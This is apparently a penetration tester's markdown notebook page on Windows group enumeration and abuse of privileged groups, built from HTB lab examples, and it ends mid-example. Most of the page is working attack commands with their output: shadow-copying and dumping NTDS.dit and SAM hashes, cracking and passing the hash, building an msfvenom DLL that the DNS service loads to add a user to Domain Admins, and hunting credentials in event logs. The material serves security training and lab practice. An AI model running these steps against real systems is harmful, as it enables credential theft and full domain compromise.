---
id: Group
aliases: []
tags:
  - Microsoft/Windows/Privesc/Group
links: Privesc
---

<!-- Group Enumeration {{{-->
# Group Enumeration

___

<!-- Identify {{{-->
## Identify

<!-- User {{{-->
### User

Enumerate a user's security groups

<!-- Tip {{{-->
> [!tip]
>
> Check for
>
> - Inherited rights from group membership
> - Active Directory privileges
<!-- }}} -->

**LOCAL**

[whoami](https://en.wikipedia.org/wiki/Whoami) —
Current local user's security groups & [[Windows/Privesc/Privileges|privilege]] status

```sh
whoami /groups
```

[net user](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-user) —
Specific local user's security groups

```sh
net user <user>
```

[Get-LocalUser](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) —
Specific local user's security groups

```powershell
Get-LocalUser <user> | Get-LocalGroupMember
```

**DOMAIN**

[Get-ADUser](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2025-ps) —
Get [[Active Directory]] user

```powershell
Get-ADUser <user> -Properties MemberOf | Select-Object -Expand MemberOf
```

<!-- }}} -->

<!-- Group {{{-->
### Group

Identify local and domain groups

<!-- Tip {{{-->
> [!tip]
>
> Check for
>
> - Non-standard groups
> - Misconfigured group membership
<!-- }}} -->

**LOCAL**

[net localgroup](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc725622(v=ws.11)) —
Get local [[SAM]] groups

```sh
net localgroup
```

[Get-LocalGroup](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localgroup?view=powershell-5.1) —
Get local [[SAM]] groups

```powershell
Get-LocalGroup
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
C:\htb> net localgroup
> ```
> ```sh
> Aliases for \\WINLPE-SRV01
>
> -------------------------------------------------------------------------------
> *Access Control Assistance Operators
> *Administrators
> *Backup Operators
> *Certificate Service DCOM Access
> *Cryptographic Operators
> *Distributed COM Users
> *Event Log Readers
> *Guests
> *Hyper-V Administrators
> *IIS_IUSRS
> *Network Configuration Operators
> *Performance Log Users
> *Performance Monitor Users
> *Power Users
> *Print Operators
> *RDS Endpoint Servers
> *RDS Management Servers
> *RDS Remote Access Servers
> *Remote Desktop Users
> *Remote Management Users
> *Replicator
> *Storage Replica Administrators
> *System Managed Accounts Group
> *Users
> The command completed successfully.
> ```
<!-- }}} -->

**DOMAIN**

[net group](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754051(v=ws.11)) —
Get [[Active Directory]] domain groups

```sh
net group /domain
```

[Get-ADGroup](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2025-ps) —
Get [[Active Directory]] domain groups

```powershell
Get-ADGroup -Filter *
```


<!-- Group Members {{{-->
#### Group Members

Members of a specific group

```cmd
net localgroup <group>
```

```powershell
Get-LocalGroupMember <group> | ft Name, PrincipalSource
```

`Administrators` group members

```cmd
net localgroup Administrators
```

```powershell
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> net localgroup administrators
> ```
> ```sh
> Alias name     administrators
> Comment        Administrators have complete and unrestricted access to the computer/domain
>
> Members
>
> -------------------------------------------------------------------------------
> Administrator
> helpdesk
> sarah
> secsvc
> The command completed successfully.
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Privileged Groups {{{-->
# Privileged Groups

Privileged groups can be leveraged to escalate privileges

<!-- Resources {{{-->
> [!info]- Resources
>
> - [Active Directory privileged accounts and groups reference guide](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
>
> - [HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
<!-- }}} -->

<!-- Admin Groups {{{-->
## Admin Groups

<!-- Administrators {{{-->
### Administrators

[Administrators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#administrators)
have a complete and unrestricted access to a computer

```powershell
Get-NetGroupMember -Identity "Administrators" -Recurse
```

<!-- }}} -->

<!-- Domain Admins {{{-->
### Domain Admins

[Domain Admins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#domain-admins)
are authorized to administer the domain

```powershell
Get-NetGroupMember -Identity "Domain Admins" -Recurse
```

<!-- }}} -->

<!-- Enterprise Admins {{{-->
### Enterprise Admins

[Enterprise Admins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#enterprise-admins)
can control everything across every domain in the entire forest

**Enterprise Admins** exist only in the root domain of an
[[Active Directory]] forest of domains

<!-- Actions {{{-->
> [!tip]- Actions
>
> **Full control of every domain**
> - Modify [[#Domain Admins]] groups
> - Create new admins
> - Reset passwords
> - Change [[ACL]]s
>
> **Control forest-wide configuration**
> - Edit the Configuration and Schema partitions
>
> **Modify trust relationships**
> - Create, remove, and tamper with inter-domain and external trusts
>
> **Deploy GPOs anywhere**
> - Push policies to any OU in any domain
>
> **Control schema extensions**
> - Add new object types and attributes to the forest schema
>
> **Seize/transfer FSMO roles across domains**
> - e.g., Schema Master and Domain Naming Master
>
> **Stand up or kill domains**
> - Create new child domains or delete existing ones
<!-- }}} -->

```powershell
Get-NetGroupMember -Identity "Enterprise Admins" -Recurse
```

<!-- }}} -->

<!-- }}} -->

<!-- Other Groups {{{-->
## Other Groups

<!-- Account Operators {{{-->
### Account Operators

[Account Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators)
grants limited account creation privileges to a user

> [!tip]- Actions
>
> - Create and modify non-protected accounts and groups in the domain
> - Local login to the [[Domain Controller]]

```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

<!-- }}} -->

<!-- AD Recycle Bin {{{-->
### AD Recycle Bin

Access to files on the [[Domain Controller]] is restricted
unless the user is part of [[#Server Operators]]

<!-- Actions {{{-->
> [!tip]- Actions
>
> - Read deleted [[Active Directory]] objects
<!-- }}} -->

```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

<!-- }}} -->

<!-- Backup Operators {{{-->
### Backup Operators

[Backup Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators)
can back up and restore all files on a computer,
regardless of the permissions that protect those files

- [[Privileges#SeBackupPrivilege|SeBackupPrivilege]]
allows file content retrieval

- `SeRestorePrivilege` allows file content and ownership modification

<!-- Actions {{{-->
> [!tip]- Actions
>
> - Should be considered [[#Domain Admins]]
> - Access to the `DC01` file system via [[SMB/General|SMB]]
>   (*due to the `SeBackup` and `SeRestore` privileges*)
> - Make shadow copies of the SAM/NTDS database
> - Read the registry remotely
> - Sign in and shut down the computer
<!-- }}} -->

```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

<!-- ACTIVE DIRECTORY ATTACK {{{-->
**ACTIVE DIRECTORY ATTACK**

<!-- Export NTLM Hashes {{{-->
**Export NTLM Hashes**

The [[Active Directory]] database `NTDS.dit` contains
the NTLM hashes for all user and computer objects in the domain

1. Log in to the [[Domain Controller]]

2. Create a shadow copy of the `C:` drive and expose it as `E:` drive

[diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) —
Create a volume shadow copy

```powershell
diskshadow.exe
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> diskshadow.exe
> ```
> ```powershell
> Microsoft DiskShadow version 1.0
> Copyright (C) 2013 Microsoft Corporation
> On computer:  DC,  10/14/2020 12:57:52 AM
> ```
>
> ```powershell
> DISKSHADOW> set verbose on
> ```
> ```powershell
> DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
> ```
> ```powershell
> DISKSHADOW> set context clientaccessible
> ```
> ```powershell
> DISKSHADOW> set context persistent
> ```
> ```powershell
> DISKSHADOW> begin backup
> ```
> ```powershell
> DISKSHADOW> add volume C: alias cdrive
> ```
> ```powershell
> DISKSHADOW> create
> ```
> ```powershell
> DISKSHADOW> expose %cdrive% E:
> ```
> ```powershell
> DISKSHADOW> end backup
> ```
> ```powershell
> DISKSHADOW> exit
> ```
>
> ```powershell
> PS C:\htb> dir E:
> ```
>
> ```powershell
>     Directory: E:\
>
>
> Mode                LastWriteTime         Length Name
> ----                -------------         ------ ----
> d-----         5/6/2021   1:00 PM                Confidential
> d-----        9/15/2018  12:19 AM                PerfLogs
> d-r---        3/24/2021   6:20 PM                Program Files
> d-----        9/15/2018   2:06 AM                Program Files (x86)
> d-----         5/6/2021   1:05 PM                Tools
> d-r---         5/6/2021  12:51 PM                Users
> d-----        3/24/2021   6:38 PM                Windows
> ```
<!-- }}} -->

3. Import [SeBackupPrivilege POC](https://github.com/giuliano108/SeBackupPrivilege)
   libraries

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
```

```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

4. Copy `ntds.dit` from the remote machine (*bypass ACL*)

[Copy-FileSeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) —
Copy `ntds.dit` locally

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
> ```
>
> ```powershell
> Copied 16777216 bytes
> ```
<!-- }}} -->

[robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) —
Copy `ntds.dit` locally

```sh
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
> ```
>
> ```powershell
> -------------------------------------------------------------------------------
>    ROBOCOPY     ::     Robust File Copy for Windows
> -------------------------------------------------------------------------------
>
>   Started : Thursday, May 6, 2021 1:11:47 PM
>    Source : E:\Windows\NTDS\
>      Dest : C:\Tools\ntds\
>
>     Files : ntds.dit
>
>   Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
>
> ------------------------------------------------------------------------------
>
>           New Dir          1    E:\Windows\NTDS\
> 100%        New File              16.0 m        ntds.dit
>
> ------------------------------------------------------------------------------
>
>                Total    Copied   Skipped  Mismatch    FAILED    Extras
>     Dirs :         1         1         0         0         0         0
>    Files :         1         1         0         0         0         0
>    Bytes :   16.00 m   16.00 m         0         0         0         0
>    Times :   0:00:00   0:00:00                       0:00:00   0:00:00
>
>
>    Speed :           356962042 Bytes/sec.
>    Speed :           20425.531 MegaBytes/min.
>    Ended : Thursday, May 6, 2021 1:11:47 PM
> ```
<!-- }}} -->

5. Extract NThashes from `ntds.dit`

<!-- Info {{{-->
> [!info]- NThash
>
> username:RID:LMhash:NThash
>
> ```sh
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> user:1001:aad3b435b51404eeaad3b435b51404ee:f2c4e8c5c8b1f0b3c2e0d4a9b9c1e2d3:::
> ```
<!-- }}} -->

[secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) —
Extract all [[Active Directory]] account credentials

```sh
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
> ```
>
> ```sh
> Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
>
> [*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
> [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
> [*] Searching for pekList, be patient
> [*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
> [*] Reading and decrypting hashes from ntds.dit 
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
> krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
> htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
> svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
> bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
> hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
> printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
>
> <SNIP>
> ```
<!-- }}} -->

[DSInternals](https://github.com/MichaelGrafnetter/DSInternals) —
Extract all [[Active Directory]] account credentials

```powershell
Import-Module .\DSInternals.psd1
```
```powershell
$key = Get-BootKey -SystemHivePath .\SYSTEM
```
```powershell
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Import-Module .\DSInternals.psd1
> ```
> ```powershell
> PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
> ```
> ```powershell
> PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
> ```
>
> ```powershell
> DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> Sid: S-1-5-21-669053619-2741956077-1013132368-500
> Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
> SamAccountName: Administrator
> SamAccountType: User
> UserPrincipalName:
> PrimaryGroupId: 513
> SidHistory:
> Enabled: True
> UserAccountControl: NormalAccount, PasswordNeverExpires
> AdminCount: True
> Deleted: False
> LastLogonDate: 5/6/2021 5:40:30 PM
> DisplayName:
> GivenName:
> Surname:
> Description: Built-in account for administering the computer/domain
> ServicePrincipalName:
> SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
> DiscretionaryAclProtected, SelfRelative
> Owner: S-1-5-21-669053619-2741956077-1013132368-512
> Secrets
>   NTHash: cf3a5525ee9414229e66279623ed5c58
>   LMHash:
>   NTHashHistory:
>   LMHashHistory:
>   SupplementalCredentials:
>     ClearText:
>     NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
>     Kerberos:
>       Credentials:
>         DES_CBC_MD5
>           Key: d60dfbbf20548938
>       OldCredentials:
>       Salt: WIN-NB4NGP3TKNKAdministrator
>       Flags: 0
>     KerberosNew:
>       Credentials:
>         AES256_CTS_HMAC_SHA1_96
>           Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
>           Iterations: 4096
>         AES128_CTS_HMAC_SHA1_96
>           Key: 94c300d0e47775b407f2496a5cca1a0a
>           Iterations: 4096
>         DES_CBC_MD5
>           Key: d60dfbbf20548938
>           Iterations: 4096
>       OldCredentials:
>       OlderCredentials:
>       ServiceCredentials:
>       Salt: WIN-NB4NGP3TKNKAdministrator
>       DefaultIterationCount: 4096
>       Flags: 0
>     WDigest:
> Key Credentials:
> Credential Roaming
>   Created:
>   Modified:
>   Credentials:
> ```
<!-- }}} -->

6. Post-Exploitation

[[Hashcat]] — Crack NTLM hash offline

```sh
hashcat -m 1000 hashes.txt wordlist.txt
```

[[NetExec]] — Pass-the-Hash to Domain Administrator

```sh
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"
```

[[NetExec]] — Execute via SMB using an `exec` method

```sh
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

<!-- }}} -->

<!-- }}} -->

<!-- LOCAL ACCOUNT ATTACK {{{-->
**LOCAL ACCOUNT ATTACK**

<!-- Export Local Account Hashes {{{-->
**Export Local Account Hashes**

Backup registry hives (*`SAM` & `SYSTEM`*)
and extract local account credentials

<!-- Registry Hives {{{-->
> [!info]- Registry Hives
>
> - **SAM**: Local account database
> - **SYSTEM**: Contains the boot keys needed to decrypt SAM
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> SAM hashes on Domain Controllers usually not interesting —
> DCs rarely use local accounts for admin access
<!-- }}} -->

1. Login to the [[Domain Controller]]

2. Backup registry hives

```sh
reg save HKLM\SYSTEM SYSTEM.SAV
```
```sh
reg save HKLM\SAM SAM.SAV
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
> ```
>
> ```sh
> The operation completed successfully.
> ```
>
> ```sh
> C:\htb> reg save HKLM\SAM SAM.SAV
> ```
>
> ```sh
> The operation completed successfully.
> ```
<!-- }}} -->

3. Extract local NThashes

<!-- Info {{{-->
> [!info]- NThash
>
> username:RID:LMhash:NThash
>
> ```sh
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> user:1001:aad3b435b51404eeaad3b435b51404ee:f2c4e8c5c8b1f0b3c2e0d4a9b9c1e2d3:::
> ```
<!-- }}} -->

[secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) —
Extract boot key from `SYSTEM.SAV` and decrypt `SAM.SAV`

```sh
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL
```

4. Post-Exploitation

[[Hashcat]] — Crack NTLM hash offline

```sh
hashcat -m 1000 <ntlm_hash> /usr/share/wordlists/rockyou.txt
```


<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

<!-- DnsAdmins {{{-->
### DnsAdmins

[DnsAdmins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins)
have access to DNS information on the network

<!-- Actions {{{-->
> [!tip]- Actions
>
> - Create/modify/delete DNS zones and records
> - Change DNS server settings
> - Add arbitrary DNS entries (*poisoning, redirection, MITM groundwork*)
> - Manage DNS delegation and conditional forwarders
> - Load/modify DNS plug-ins (*DLL Injection*)
<!-- }}} -->

```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

**DNSADMIN ACCESS WITH CUSTOM DLL**

Generate a malicious DLL to add a user to the `domain admins` group

The [[DNS/General|DNS]] service runs as `NT AUTHORITY\SYSTEM`
that can be leveraged to escalate privileges on a [[Domain Controller]]

<!-- Danger {{{-->
> [!danger]
>
> [[DNS/General|DNS]] may be taken down
> for the entire [[Active Directory]] environment
<!-- }}} -->

<!-- Attack Overview {{{-->
> [!tip]- Attack Overview
>
> - DNS management is performed over RPC
> - `ServerLevelPluginDll` loads a custom DLL with zero verification
>   of the DLL's path
> - When a member of the [[#DnsAdmins]] group runs the `dnscmd` command,
>   the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`
>   registry key is populated
> - When the DNS service is restarted, the DLL in this path will be loaded
>   (*i.e., a network share that the [[Domain Controller]]'s machine account
>   can access)
> - An attacker can load a custom DLL to obtain a reverse shell
>   or even [[Mimikatz]] to dump credentials
<!-- }}} -->

1. [Get-ADGroupMember](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember?view=windowsserver2025-ps) —
Confirm `DnsAdmins` group membership

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> Get-ADGroupMember -Identity DnsAdmins
> ```
>
> ```powershell
> distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> name              : netadm
> objectClass       : user
> objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
> SamAccountName    : netadm
> SID               : S-1-5-21-669053619-2741956077-1013132368-1109           
> ```
<!-- }}} -->

2. [[Msfvenom]] — Create malicious DLL

```sh
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

<!-- Example {{{-->
> [!example]-
> ```sh
> msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
> ```
>
> ```sh
> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
> [-] No arch selected, selecting arch: x64 from the payload
> No encoder specified, outputting raw payload
> Payload size: 313 bytes
> Final size of dll file: 5120 bytes
> Saved as: adduser.dll
> ```
<!-- }}} -->

3. [[Pentest/File Transfer/Windows/Download|Download]] the file to the target


4. [dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) —
   Load DLL as a member of `DnsAdmins` to the [[Registry]]
   without verification

<!-- Tip {{{-->
> [!tip]-
>
> It is also possible to load [[Mimikatz]] to dump credentials
<!-- }}} -->

```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
> ```
>
> ```powershell
> Registry property serverlevelplugindll successfully reset.
> Command completed successfully.
> ```
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> The path to the DLL needs to be specified explicitly
>
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> Loading the DLL as non-privileged user result in an error
>
> <!-- Example {{{-->
> > [!example]-
> >
> > ```powershell
> > C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
> > ```
> >
> > ```powershell
> >
> > DNS Server failed to reset registry property.
> >     Status = 5 (0x00000005)
> > Command failed: ERROR_ACCESS_DENIED
> > ```
> <!-- }}} -->
<!-- }}} -->

5. Find a user's `SID`

```powershell
wmic useraccount where name="netadm" get sid
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> wmic useraccount where name="netadm" get sid
> ```
>
> ```powershell
> SID
> S-1-5-21-669053619-2741956077-1013132368-1109
> ```
<!-- }}} -->

6. [sc](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)) —
Check [service permissions](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
(*`SERVICE_START` & `SERVICE_STOP`*)

```powershell
sc.exe sdshow DNS
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> sc.exe sdshow DNS
> ```
>
> ```powershell
> D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
> ```
<!-- }}} -->

7. [sc](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)) —
Stop and start the DNS service

```powershell
sc stop dns
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> sc stop dns
> ```
>
> ```powershell
> SERVICE_NAME: dns
>         TYPE               : 10  WIN32_OWN_PROCESS
>         STATE              : 3  STOP_PENDING
>                                 (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
>         WIN32_EXIT_CODE    : 0  (0x0)
>         SERVICE_EXIT_CODE  : 0  (0x0)
>         CHECKPOINT         : 0x1
>         WAIT_HINT          : 0x7530
> ```
<!-- }}} -->

```powershell
sc start dns
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> sc start dns
> ```
>
> ```powershell
> SERVICE_NAME: dns
>         TYPE               : 10  WIN32_OWN_PROCESS
>         STATE              : 2  START_PENDING
>                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
>         WIN32_EXIT_CODE    : 0  (0x0)
>         SERVICE_EXIT_CODE  : 0  (0x0)
>         CHECKPOINT         : 0x0
>         WAIT_HINT          : 0x7d0
>         PID                : 6960
>         FLAGS              :
> ```
<!-- }}} -->

> [!warning]
>
> The DNS service may fail to start with the custom DLL

8. Confirm group membership

```powershell
net group "Domain Admins" /dom
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> net group "Domain Admins" /dom
> ```
>
> ```powershell
> Group name     Domain Admins
> Comment        Designated administrators of the domain
>
> Members
>
> -------------------------------------------------------------------------------
> Administrator            netadm
> The command completed successfully.
> ```
<!-- }}} -->

**Clean-Up**

<!-- Warning {{{-->
> [!warning]
>
> The steps must be taken from an elevated console with a local
> or domain admin account
<!-- }}} -->

1. Confirm added key to the [[Registry]]

```powershell
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
> ```
>
> ```powershell
> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
>     GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
>     EnableGlobalQueryBlockList    REG_DWORD    0x1
>     PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
>     Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
>     ForwardingTimeout    REG_DWORD    0x3
>     IsSlave    REG_DWORD    0x0
>     BootMethod    REG_DWORD    0x3
>     AdminConfigured    REG_DWORD    0x1
>     ServerLevelPluginDll    REG_SZ    adduser.dll
> ```
<!-- }}} -->

2. Delete registry key

```powershell
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
> ```
>
> ```powershell
> Delete the registry value ServerLevelPluginDll (Yes/No)? Y
> The operation completed successfully.
> ```
<!-- }}} -->

3. Start the [[DNS/General|DNS]] service

```powershell
C:\htb> sc.exe start dns
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> sc.exe start dns
> ```
>
> ```powershell
> SERVICE_NAME: dns
>         TYPE               : 10  WIN32_OWN_PROCESS
>         STATE              : 2  START_PENDING
>                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
>         WIN32_EXIT_CODE    : 0  (0x0)
>         SERVICE_EXIT_CODE  : 0  (0x0)
>         CHECKPOINT         : 0x0
>         WAIT_HINT          : 0x7d0
>         PID                : 4984
>         FLAGS              :
> ```
<!-- }}} -->

4. Check service status

```powershell
sc query dns
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> C:\htb> sc query dns
> ```
>
> ```powershell
> SERVICE_NAME: dns
>         TYPE               : 10  WIN32_OWN_PROCESS
>         STATE              : 4  RUNNING
>                                 (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
>         WIN32_EXIT_CODE    : 0  (0x0)
>         SERVICE_EXIT_CODE  : 0  (0x0)
>         CHECKPOINT         : 0x0
>         WAIT_HINT          : 0x0
> ```
<!-- }}} -->

**REVERSE SHELL**

[mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) —
[Gain command execution](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

1. Modify the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)
   file to execute a PowerShell [reverse shell](https://www.revshells.com/)


<!-- }}} -->

<!-- Event Log Readers {{{-->
### Event Log Readers

[Event Log Readers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#event-log-readers)
can read Event Logs from local computers

```powershell
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
```

```powershell
net localgroup "Event Log Readers"
```

1. Query Windows Events

[wevtutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) —
Retrieve information about event logs

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

```powershell
wevtutil qe Security /rd:true /f:text /r:share01 /u:<user> /p:<password> | findstr "/user"
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"
> ```
>
> ```powershell
>         Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
> ```
<!-- }}} -->

2. Search Security Logs

[Get-Winevent](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.5&viewFallbackFrom=powershell-7.1) —
Get event from Event Logs

```powershell
Get-WinEvent -LogName security |
  where {
    $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'
  } |
  Select-Object @{name='CommandLine';expression={$_.Properties[8].Value}}
```

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
  Where-Object {
    $_.Properties[8].Value -match 'pass|user|cred|token|net use|runas|HTB|flag'
  } |
  Select-Object TimeCreated, @{n='CommandLine';e={$_.Properties[8].Value}}
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
